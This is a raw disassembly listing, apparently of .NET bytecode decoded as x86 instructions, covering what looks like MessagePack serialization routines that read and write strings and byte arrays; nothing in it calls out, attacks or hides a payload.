  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	00 40 55             	add    %al,0x55(%eax)
  4051c2:	00 00                	add    %al,(%eax)
  4051c4:	00 18                	add    %bl,(%eax)
  4051c6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051ca:	01 0b                	add    %ecx,(%ebx)
  4051cc:	03 07                	add    (%edi),%eax
  4051ce:	16                   	push   %ss
  4051cf:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051d2:	00 00                	add    %al,(%eax)
  4051d4:	0a 26                	or     (%esi),%ah
  4051d6:	07                   	pop    %es
  4051d7:	28 58 00             	sub    %bl,0x0(%eax)
  4051da:	00 06                	add    %al,(%esi)
  4051dc:	0b 07                	or     (%edi),%eax
  4051de:	16                   	push   %ss
  4051df:	28 07                	sub    %al,(%edi)
  4051e1:	01 00                	add    %eax,(%eax)
  4051e3:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051e6:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051e9:	00 06                	add    %al,(%esi)
  4051eb:	02 18                	add    (%eax),%bl
  4051ed:	7d 36                	jge    0x405225
  4051ef:	00 00                	add    %al,(%eax)
  4051f1:	04 16                	add    $0x16,%al
  4051f3:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051f8:	00 02                	add    %al,(%edx)
  4051fa:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051fe:	06                   	push   %es
  4051ff:	25 03 28 96 00       	and    $0x962803,%eax
  405204:	00 06                	add    %al,(%esi)
  405206:	6f                   	outsl  %ds:(%esi),(%dx)
  405207:	6a 00                	push   $0x0
  405209:	00 06                	add    %al,(%esi)
  40520b:	03 6f 88             	add    -0x78(%edi),%ebp
  40520e:	00 00                	add    %al,(%eax)
  405210:	06                   	push   %es
  405211:	09 17                	or     %edx,(%edi)
  405213:	58                   	pop    %eax
  405214:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405219:	2a 06                	sub    (%esi),%al
  40521b:	20 df                	and    %bl,%bh
  40521d:	00 00                	add    %al,(%eax)
  40521f:	00 40 55             	add    %al,0x55(%eax)
  405222:	00 00                	add    %al,(%eax)
  405224:	00 1a                	add    %bl,(%edx)
  405226:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40522a:	01 0b                	add    %ecx,(%ebx)
  40522c:	03 07                	add    (%edi),%eax
  40522e:	16                   	push   %ss
  40522f:	1a 6f 45             	sbb    0x45(%edi),%ch
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 26                	or     (%esi),%ah
  405236:	07                   	pop    %es
  405237:	28 58 00             	sub    %bl,0x0(%eax)
  40523a:	00 06                	add    %al,(%esi)
  40523c:	0b 07                	or     (%edi),%eax
  40523e:	16                   	push   %ss
  40523f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405243:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405246:	28 6b 00             	sub    %ch,0x0(%ebx)
  405249:	00 06                	add    %al,(%esi)
  40524b:	02 18                	add    (%eax),%bl
  40524d:	7d 36                	jge    0x405285
  40524f:	00 00                	add    %al,(%eax)
  405251:	04 16                	add    $0x16,%al
  405253:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405258:	00 02                	add    %al,(%edx)
  40525a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40525e:	06                   	push   %es
  40525f:	25 03 28 96 00       	and    $0x962803,%eax
  405264:	00 06                	add    %al,(%esi)
  405266:	6f                   	outsl  %ds:(%esi),(%dx)
  405267:	6a 00                	push   $0x0
  405269:	00 06                	add    %al,(%esi)
  40526b:	03 6f 88             	add    -0x78(%edi),%ebp
  40526e:	00 00                	add    %al,(%eax)
  405270:	06                   	push   %es
  405271:	09 17                	or     %edx,(%edi)
  405273:	58                   	pop    %eax
  405274:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405279:	2a 06                	sub    (%esi),%al
  40527b:	20 da                	and    %bl,%dl
  40527d:	00 00                	add    %al,(%eax)
  40527f:	00 40 0e             	add    %al,0xe(%eax)
  405282:	00 00                	add    %al,(%eax)
  405284:	00 02                	add    %al,(%edx)
  405286:	06                   	push   %es
  405287:	03 28                	add    (%eax),%ebp
  405289:	97                   	xchg   %eax,%edi
  40528a:	00 00                	add    %al,(%eax)
  40528c:	06                   	push   %es
  40528d:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405293:	06                   	push   %es
  405294:	20 db                	and    %bl,%bl
  405296:	00 00                	add    %al,(%eax)
  405298:	00 40 0e             	add    %al,0xe(%eax)
  40529b:	00 00                	add    %al,(%eax)
  40529d:	00 02                	add    %al,(%edx)
  40529f:	06                   	push   %es
  4052a0:	03 28                	add    (%eax),%ebp
  4052a2:	97                   	xchg   %eax,%edi
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	06                   	push   %es
  4052a6:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052ac:	06                   	push   %es
  4052ad:	20 d0                	and    %dl,%al
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	00 40 0f             	add    %al,0xf(%eax)
  4052b4:	00 00                	add    %al,(%eax)
  4052b6:	00 02                	add    %al,(%edx)
  4052b8:	03 6f 00             	add    0x0(%edi),%ebp
  4052bb:	01 00                	add    %eax,(%eax)
  4052bd:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c0:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052c4:	06                   	push   %es
  4052c5:	2a 06                	sub    (%esi),%al
  4052c7:	20 d1                	and    %dl,%cl
  4052c9:	00 00                	add    %al,(%eax)
  4052cb:	00 40 27             	add    %al,0x27(%eax)
  4052ce:	00 00                	add    %al,(%eax)
  4052d0:	00 18                	add    %bl,(%eax)
  4052d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052d6:	01 0b                	add    %ecx,(%ebx)
  4052d8:	03 07                	add    (%edi),%eax
  4052da:	16                   	push   %ss
  4052db:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	0a 26                	or     (%esi),%ah
  4052e2:	07                   	pop    %es
  4052e3:	28 58 00             	sub    %bl,0x0(%eax)
  4052e6:	00 06                	add    %al,(%esi)
  4052e8:	0b 02                	or     (%edx),%eax
  4052ea:	07                   	pop    %es
  4052eb:	16                   	push   %ss
  4052ec:	28 07                	sub    %al,(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 6a 28             	or     0x28(%edx),%ch
  4052f3:	74 00                	je     0x4052f5
  4052f5:	00 06                	add    %al,(%esi)
  4052f7:	2a 06                	sub    (%esi),%al
  4052f9:	20 d2                	and    %dl,%dl
  4052fb:	00 00                	add    %al,(%eax)
  4052fd:	00 40 27             	add    %al,0x27(%eax)
  405300:	00 00                	add    %al,(%eax)
  405302:	00 1a                	add    %bl,(%edx)
  405304:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405308:	01 0b                	add    %ecx,(%ebx)
  40530a:	03 07                	add    (%edi),%eax
  40530c:	16                   	push   %ss
  40530d:	1a 6f 45             	sbb    0x45(%edi),%ch
  405310:	00 00                	add    %al,(%eax)
  405312:	0a 26                	or     (%esi),%ah
  405314:	07                   	pop    %es
  405315:	28 58 00             	sub    %bl,0x0(%eax)
  405318:	00 06                	add    %al,(%esi)
  40531a:	0b 02                	or     (%edx),%eax
  40531c:	07                   	pop    %es
  40531d:	16                   	push   %ss
  40531e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405322:	0a 6a 28             	or     0x28(%edx),%ch
  405325:	74 00                	je     0x405327
  405327:	00 06                	add    %al,(%esi)
  405329:	2a 06                	sub    (%esi),%al
  40532b:	20 d3                	and    %dl,%bl
  40532d:	00 00                	add    %al,(%eax)
  40532f:	00 40 25             	add    %al,0x25(%eax)
  405332:	00 00                	add    %al,(%eax)
  405334:	00 1e                	add    %bl,(%esi)
  405336:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40533a:	01 0b                	add    %ecx,(%ebx)
  40533c:	03 07                	add    (%edi),%eax
  40533e:	16                   	push   %ss
  40533f:	1e                   	push   %ds
  405340:	6f                   	outsl  %ds:(%esi),(%dx)
  405341:	45                   	inc    %ebp
  405342:	00 00                	add    %al,(%eax)
  405344:	0a 26                	or     (%esi),%ah
  405346:	07                   	pop    %es
  405347:	28 58 00             	sub    %bl,0x0(%eax)
  40534a:	00 06                	add    %al,(%esi)
  40534c:	0b 02                	or     (%edx),%eax
  40534e:	07                   	pop    %es
  40534f:	16                   	push   %ss
  405350:	28 08                	sub    %cl,(%eax)
  405352:	01 00                	add    %eax,(%eax)
  405354:	0a 28                	or     (%eax),%ch
  405356:	74 00                	je     0x405358
  405358:	00 06                	add    %al,(%esi)
  40535a:	2a 00                	sub    (%eax),%al
  40535c:	1b 30                	sbb    (%eax),%esi
  40535e:	04 00                	add    $0x0,%al
  405360:	4d                   	dec    %ebp
  405361:	00 00                	add    %al,(%eax)
  405363:	00 27                	add    %ah,(%edi)
  405365:	00 00                	add    %al,(%eax)
  405367:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40536a:	00 00                	add    %al,(%eax)
  40536c:	0a 0a                	or     (%edx),%cl
  40536e:	02 06                	add    (%esi),%al
  405370:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  405376:	6f                   	outsl  %ds:(%esi),(%dx)
  405377:	e2 00                	loop   0x405379
  405379:	00 0a                	add    %cl,(%edx)
  40537b:	d4 8d                	aam    $0x8d
  40537d:	44                   	inc    %esp
  40537e:	00 00                	add    %al,(%eax)
  405380:	01 0b                	add    %ecx,(%ebx)
  405382:	06                   	push   %es
  405383:	16                   	push   %ss
  405384:	6a 6f                	push   $0x6f
  405386:	4e                   	dec    %esi
  405387:	00 00                	add    %al,(%eax)
  405389:	0a 06                	or     (%esi),%al
  40538b:	07                   	pop    %es
  40538c:	16                   	push   %ss
  40538d:	06                   	push   %es
  40538e:	6f                   	outsl  %ds:(%esi),(%dx)
  40538f:	e2 00                	loop   0x405391
  405391:	00 0a                	add    %cl,(%edx)
  405393:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40539a:	07                   	pop    %es
  40539b:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a1:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053a7:	39 06                	cmp    %eax,(%esi)
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	00 06                	add    %al,(%esi)
  4053ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4053ae:	33 00                	xor    (%eax),%eax
  4053b0:	00 0a                	add    %cl,(%edx)
  4053b2:	dc 08                	fmull  (%eax)
  4053b4:	2a 00                	sub    (%eax),%al
  4053b6:	00 00                	add    %al,(%eax)
  4053b8:	01 10                	add    %edx,(%eax)
  4053ba:	00 00                	add    %al,(%eax)
  4053bc:	02 00                	add    (%eax),%al
  4053be:	06                   	push   %es
  4053bf:	00 38                	add    %bh,(%eax)
  4053c1:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053c8:	13 30                	adc    (%eax),%esi
  4053ca:	02 00                	add    (%eax),%al
  4053cc:	ec                   	in     (%dx),%al
  4053cd:	00 00                	add    %al,(%eax)
  4053cf:	00 20                	add    %ah,(%eax)
  4053d1:	00 00                	add    %al,(%eax)
  4053d3:	11 02                	adc    %eax,(%edx)
  4053d5:	7b 36                	jnp    0x40540d
  4053d7:	00 00                	add    %al,(%eax)
  4053d9:	04 0a                	add    $0xa,%al
  4053db:	06                   	push   %es
  4053dc:	45                   	inc    %ebp
  4053dd:	0c 00                	or     $0x0,%al
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	05 00 00 00 05       	add    $0x5000000,%eax
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053f3:	00 00                	add    %al,(%eax)
  4053f5:	1e                   	push   %ds
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 30                	add    %dh,(%eax)
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	00 42 00             	add    %al,0x0(%edx)
  4053ff:	00 00                	add    %al,(%eax)
  405401:	54                   	push   %esp
  405402:	00 00                	add    %al,(%eax)
  405404:	00 66 00             	add    %ah,0x0(%esi)
  405407:	00 00                	add    %al,(%eax)
  405409:	79 00                	jns    0x40540b
  40540b:	00 00                	add    %al,(%eax)
  40540d:	86 00                	xchg   %al,(%eax)
  40540f:	00 00                	add    %al,(%eax)
  405411:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  405417:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  40541d:	03 02                	add    (%edx),%eax
  40541f:	7b 35                	jnp    0x405456
  405421:	00 00                	add    %al,(%eax)
  405423:	04 74                	add    $0x74,%al
  405425:	38 00                	cmp    %al,(%eax)
  405427:	00 01                	add    %al,(%ecx)
  405429:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  40542f:	03 02                	add    (%edx),%eax
  405431:	7b 35                	jnp    0x405468
  405433:	00 00                	add    %al,(%eax)
  405435:	04 a5                	add    $0xa5,%al
  405437:	68 00 00 01 28       	push   $0x28010000
  40543c:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405441:	03 02                	add    (%edx),%eax
  405443:	7b 35                	jnp    0x40547a
  405445:	00 00                	add    %al,(%eax)
  405447:	04 a5                	add    $0xa5,%al
  405449:	95                   	xchg   %eax,%ebp
  40544a:	00 00                	add    %al,(%eax)
  40544c:	01 28                	add    %ebp,(%eax)
  40544e:	9f                   	lahf
  40544f:	00 00                	add    %al,(%eax)
  405451:	06                   	push   %es
  405452:	2a 03                	sub    (%ebx),%al
  405454:	02 7b 35             	add    0x35(%ebx),%bh
  405457:	00 00                	add    %al,(%eax)
  405459:	04 a5                	add    $0xa5,%al
  40545b:	6c                   	insb   (%dx),%es:(%edi)
  40545c:	00 00                	add    %al,(%eax)
  40545e:	01 28                	add    %ebp,(%eax)
  405460:	9e                   	sahf
  405461:	00 00                	add    %al,(%eax)
  405463:	06                   	push   %es
  405464:	2a 03                	sub    (%ebx),%al
  405466:	02 7b 35             	add    0x35(%ebx),%bh
  405469:	00 00                	add    %al,(%eax)
  40546b:	04 a5                	add    $0xa5,%al
  40546d:	96                   	xchg   %eax,%esi
  40546e:	00 00                	add    %al,(%eax)
  405470:	01 28                	add    %ebp,(%eax)
  405472:	9c                   	pushf
  405473:	00 00                	add    %al,(%eax)
  405475:	06                   	push   %es
  405476:	2a 03                	sub    (%ebx),%al
  405478:	02 7b 35             	add    0x35(%ebx),%bh
  40547b:	00 00                	add    %al,(%eax)
  40547d:	04 a5                	add    $0xa5,%al
  40547f:	97                   	xchg   %eax,%edi
  405480:	00 00                	add    %al,(%eax)
  405482:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  405486:	00 00                	add    %al,(%eax)
  405488:	06                   	push   %es
  405489:	2a 03                	sub    (%ebx),%al
  40548b:	02 28                	add    (%eax),%ch
  40548d:	77 00                	ja     0x40548f
  40548f:	00 06                	add    %al,(%esi)
  405491:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  405497:	03 02                	add    (%edx),%eax
  405499:	7b 35                	jnp    0x4054d0
  40549b:	00 00                	add    %al,(%eax)
  40549d:	04 74                	add    $0x74,%al
  40549f:	02 00                	add    (%eax),%al
  4054a1:	00 1b                	add    %bl,(%ebx)
  4054a3:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054a9:	02 03                	add    (%ebx),%al
  4054ab:	28 72 00             	sub    %dh,0x0(%edx)
  4054ae:	00 06                	add    %al,(%esi)
  4054b0:	2a 02                	sub    (%edx),%al
  4054b2:	03 28                	add    (%eax),%ebp
  4054b4:	73 00                	jae    0x4054b6
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 03                	sub    (%ebx),%al
  4054ba:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c0:	1b 30                	sbb    (%eax),%esi
  4054c2:	03 00                	add    (%eax),%eax
  4054c4:	42                   	inc    %edx
  4054c5:	00 00                	add    %al,(%eax)
  4054c7:	00 28                	add    %ch,(%eax)
  4054c9:	00 00                	add    %al,(%eax)
  4054cb:	11 02                	adc    %eax,(%edx)
  4054cd:	0a 16                	or     (%esi),%dl
  4054cf:	0b 06                	or     (%esi),%eax
  4054d1:	12 01                	adc    (%ecx),%al
  4054d3:	28 49 00             	sub    %cl,0x0(%ecx)
  4054d6:	00 0a                	add    %cl,(%edx)
  4054d8:	02 7b 39             	add    0x39(%ebx),%bh
  4054db:	00 00                	add    %al,(%eax)
  4054dd:	04 3a                	add    $0x3a,%al
  4054df:	12 00                	adc    (%eax),%al
  4054e1:	00 00                	add    %al,(%eax)
  4054e3:	02 02                	add    (%edx),%al
  4054e5:	02 7b 38             	add    0x38(%ebx),%bh
  4054e8:	00 00                	add    %al,(%eax)
  4054ea:	04 73                	add    $0x73,%al
  4054ec:	63 00                	arpl   %eax,(%eax)
  4054ee:	00 06                	add    %al,(%esi)
  4054f0:	7d 39                	jge    0x40552b
  4054f2:	00 00                	add    %al,(%eax)
  4054f4:	04 dd                	add    $0xdd,%al
  4054f6:	0d 00 00 00 07       	or     $0x7000000,%eax
  4054fb:	39 06                	cmp    %eax,(%esi)
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 06                	add    %al,(%esi)
  405501:	28 50 00             	sub    %dl,0x0(%eax)
  405504:	00 0a                	add    %cl,(%edx)
  405506:	dc 02                	faddl  (%edx)
  405508:	7b 39                	jnp    0x405543
  40550a:	00 00                	add    %al,(%eax)
  40550c:	04 2a                	add    $0x2a,%al
  40550e:	00 00                	add    %al,(%eax)
  405510:	01 10                	add    %edx,(%eax)
  405512:	00 00                	add    %al,(%eax)
  405514:	02 00                	add    (%eax),%al
  405516:	04 00                	add    $0x0,%al
  405518:	2a 2e                	sub    (%esi),%ch
  40551a:	00 0d 00 00 00 00    	add    %cl,0x0
  405520:	13 30                	adc    (%eax),%esi
  405522:	04 00                	add    $0x0,%al
  405524:	18 00                	sbb    %al,(%eax)
  405526:	00 00                	add    %al,(%eax)
  405528:	29 00                	sub    %eax,(%eax)
  40552a:	00 11                	add    %dl,(%ecx)
  40552c:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  405532:	0a 02                	or     (%edx),%al
  405534:	06                   	push   %es
  405535:	16                   	push   %ss
  405536:	03 6f 45             	add    0x45(%edi),%ebp
  405539:	00 00                	add    %al,(%eax)
  40553b:	0a 26                	or     (%esi),%ah
  40553d:	06                   	push   %es
  40553e:	28 55 00             	sub    %dl,0x0(%ebp)
  405541:	00 06                	add    %al,(%esi)
  405543:	2a 13                	sub    (%ebx),%dl
  405545:	30 04 00             	xor    %al,(%eax,%eax,1)
  405548:	b1 00                	mov    $0x0,%cl
  40554a:	00 00                	add    %al,(%eax)
  40554c:	2a 00                	sub    (%eax),%al
  40554e:	00 11                	add    %dl,(%ecx)
  405550:	14 0a                	adc    $0xa,%al
  405552:	16                   	push   %ss
  405553:	0b 02                	or     (%edx),%eax
  405555:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  40555b:	18 00                	sbb    %al,(%eax)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	02 20                	add    (%eax),%ah
  405561:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  405566:	0d 00 00 00 02       	or     $0x2000000,%eax
  40556b:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405571:	0b 38                	or     (%eax),%edi
  405573:	72 00                	jb     0x405575
  405575:	00 00                	add    %al,(%eax)
  405577:	02 20                	add    (%eax),%ah
  405579:	d9 00                	flds   (%eax)
  40557b:	00 00                	add    %al,(%eax)
  40557d:	40                   	inc    %eax
  40557e:	0c 00                	or     $0x0,%al
  405580:	00 00                	add    %al,(%eax)
  405582:	03 6f 00             	add    0x0(%edi),%ebp
  405585:	01 00                	add    %eax,(%eax)
  405587:	0a 0b                	or     (%ebx),%cl
  405589:	38 5b 00             	cmp    %bl,0x0(%ebx)
  40558c:	00 00                	add    %al,(%eax)
  40558e:	02 20                	add    (%eax),%ah
  405590:	da 00                	fiaddl (%eax)
  405592:	00 00                	add    %al,(%eax)
  405594:	40                   	inc    %eax
  405595:	25 00 00 00 18       	and    $0x18000000,%eax
  40559a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40559e:	01 0a                	add    %ecx,(%edx)
  4055a0:	03 06                	add    (%esi),%eax
  4055a2:	16                   	push   %ss
  4055a3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055a6:	00 00                	add    %al,(%eax)
  4055a8:	0a 26                	or     (%esi),%ah
  4055aa:	06                   	push   %es
  4055ab:	28 58 00             	sub    %bl,0x0(%eax)
  4055ae:	00 06                	add    %al,(%esi)
  4055b0:	0a 06                	or     (%esi),%al
  4055b2:	16                   	push   %ss
  4055b3:	28 02                	sub    %al,(%edx)
  4055b5:	01 00                	add    %eax,(%eax)
  4055b7:	0a 0b                	or     (%ebx),%cl
  4055b9:	38 2b                	cmp    %ch,(%ebx)
  4055bb:	00 00                	add    %al,(%eax)
  4055bd:	00 02                	add    %al,(%edx)
  4055bf:	20 db                	and    %bl,%bl
  4055c1:	00 00                	add    %al,(%eax)
  4055c3:	00 40 20             	add    %al,0x20(%eax)
  4055c6:	00 00                	add    %al,(%eax)
  4055c8:	00 1a                	add    %bl,(%edx)
  4055ca:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ce:	01 0a                	add    %ecx,(%edx)
  4055d0:	03 06                	add    (%esi),%eax
  4055d2:	16                   	push   %ss
  4055d3:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055d6:	00 00                	add    %al,(%eax)
  4055d8:	0a 26                	or     (%esi),%ah
  4055da:	06                   	push   %es
  4055db:	28 58 00             	sub    %bl,0x0(%eax)
  4055de:	00 06                	add    %al,(%esi)
  4055e0:	0a 06                	or     (%esi),%al
  4055e2:	16                   	push   %ss
  4055e3:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055e7:	0a 0b                	or     (%ebx),%cl
  4055e9:	07                   	pop    %es
  4055ea:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ee:	01 0a                	add    %ecx,(%edx)
  4055f0:	03 06                	add    (%esi),%eax
  4055f2:	16                   	push   %ss
  4055f3:	07                   	pop    %es
  4055f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4055f5:	45                   	inc    %ebp
  4055f6:	00 00                	add    %al,(%eax)
  4055f8:	0a 26                	or     (%esi),%ah
  4055fa:	06                   	push   %es
  4055fb:	28 55 00             	sub    %dl,0x0(%ebp)
  4055fe:	00 06                	add    %al,(%esi)
  405600:	2a 00                	sub    (%eax),%al
  405602:	00 00                	add    %al,(%eax)
  405604:	13 30                	adc    (%eax),%esi
  405606:	04 00                	add    $0x0,%al
  405608:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  40560d:	00 00                	add    %al,(%eax)
  40560f:	11 03                	adc    %eax,(%ebx)
  405611:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  405615:	06                   	push   %es
  405616:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405619:	06                   	push   %es
  40561a:	8e 69 0c             	mov    0xc(%ecx),%gs
  40561d:	16                   	push   %ss
  40561e:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  405623:	16                   	push   %ss
  405624:	00 00                	add    %al,(%eax)
  405626:	00 20                	add    %ah,(%eax)
  405628:	a0 00 00 00 08       	mov    0x8000000,%al
  40562d:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405630:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  405635:	00 00                	add    %al,(%eax)
  405637:	0a 38                	or     (%eax),%bh
  405639:	80 00 00             	addb   $0x0,(%eax)
  40563c:	00 08                	add    %cl,(%eax)
  40563e:	20 ff                	and    %bh,%bh
  405640:	00 00                	add    %al,(%eax)
  405642:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405648:	20 d9                	and    %bl,%cl
  40564a:	00 00                	add    %al,(%eax)
  40564c:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405652:	00 00                	add    %al,(%eax)
  405654:	0a 08                	or     (%eax),%cl
  405656:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  40565c:	00 00                	add    %al,(%eax)
  40565e:	0a 38                	or     (%eax),%bh
  405660:	59                   	pop    %ecx
  405661:	00 00                	add    %al,(%eax)
  405663:	00 08                	add    %cl,(%eax)
  405665:	20 ff                	and    %bh,%bh
  405667:	ff 00                	incl   (%eax)
  405669:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40566f:	20 da                	and    %bl,%dl
  405671:	00 00                	add    %al,(%eax)
  405673:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405679:	00 00                	add    %al,(%eax)
  40567b:	0a 08                	or     (%eax),%cl
  40567d:	68 28 ef 00 00       	push   $0xef28
  405682:	0a 28                	or     (%eax),%ch
  405684:	58                   	pop    %eax
  405685:	00 00                	add    %al,(%eax)
  405687:	06                   	push   %es
  405688:	0b 02                	or     (%edx),%eax
  40568a:	07                   	pop    %es
  40568b:	16                   	push   %ss
  40568c:	07                   	pop    %es
  40568d:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405690:	4c                   	dec    %esp
  405691:	00 00                	add    %al,(%eax)
  405693:	0a 38                	or     (%eax),%bh
  405695:	24 00                	and    $0x0,%al
  405697:	00 00                	add    %al,(%eax)
  405699:	20 db                	and    %bl,%bl
  40569b:	00 00                	add    %al,(%eax)
  40569d:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	0a 08                	or     (%eax),%cl
  4056a7:	28 4a 00             	sub    %cl,0x0(%edx)
  4056aa:	00 0a                	add    %cl,(%edx)
  4056ac:	28 58 00             	sub    %bl,0x0(%eax)
  4056af:	00 06                	add    %al,(%esi)
  4056b1:	0b 02                	or     (%edx),%eax
  4056b3:	07                   	pop    %es
  4056b4:	16                   	push   %ss
  4056b5:	07                   	pop    %es
  4056b6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056b9:	4c                   	dec    %esp
  4056ba:	00 00                	add    %al,(%eax)
  4056bc:	0a 02                	or     (%edx),%al
  4056be:	06                   	push   %es
  4056bf:	16                   	push   %ss
  4056c0:	06                   	push   %es
  4056c1:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c4:	4c                   	dec    %esp
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 2a                	or     (%edx),%ch
  4056c9:	00 00                	add    %al,(%eax)
  4056cb:	00 13                	add    %dl,(%ebx)
  4056cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d0:	94                   	xchg   %eax,%esp
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056d6:	00 11                	add    %dl,(%ecx)
  4056d8:	14 0a                	adc    $0xa,%al
  4056da:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e0:	07                   	pop    %es
  4056e1:	20 ff                	and    %bh,%bh
  4056e3:	00 00                	add    %al,(%eax)
  4056e5:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056eb:	20 c4                	and    %al,%ah
  4056ed:	00 00                	add    %al,(%eax)
  4056ef:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056f2:	08 6f ee             	or     %ch,-0x12(%edi)
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	0a 07                	or     (%edi),%al
  4056f9:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  4056fc:	08 6f ee             	or     %ch,-0x12(%edi)
  4056ff:	00 00                	add    %al,(%eax)
  405701:	0a 38                	or     (%eax),%bh
  405703:	59                   	pop    %ecx
  405704:	00 00                	add    %al,(%eax)
  405706:	00 07                	add    %al,(%edi)
  405708:	20 ff                	and    %bh,%bh
  40570a:	ff 00                	incl   (%eax)
  40570c:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405712:	20 c5                	and    %al,%ch
  405714:	00 00                	add    %al,(%eax)
  405716:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405719:	08 6f ee             	or     %ch,-0x12(%edi)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	0a 07                	or     (%edi),%al
  405720:	68 28 ef 00 00       	push   $0xef28
  405725:	0a 28                	or     (%eax),%ch
  405727:	58                   	pop    %eax
  405728:	00 00                	add    %al,(%eax)
  40572a:	06                   	push   %es
  40572b:	0a 02                	or     (%edx),%al
  40572d:	06                   	push   %es
  40572e:	16                   	push   %ss
  40572f:	06                   	push   %es
  405730:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405733:	4c                   	dec    %esp
  405734:	00 00                	add    %al,(%eax)
  405736:	0a 38                	or     (%eax),%bh
  405738:	24 00                	and    $0x0,%al
  40573a:	00 00                	add    %al,(%eax)
  40573c:	20 c6                	and    %al,%dh
  40573e:	00 00                	add    %al,(%eax)
  405740:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
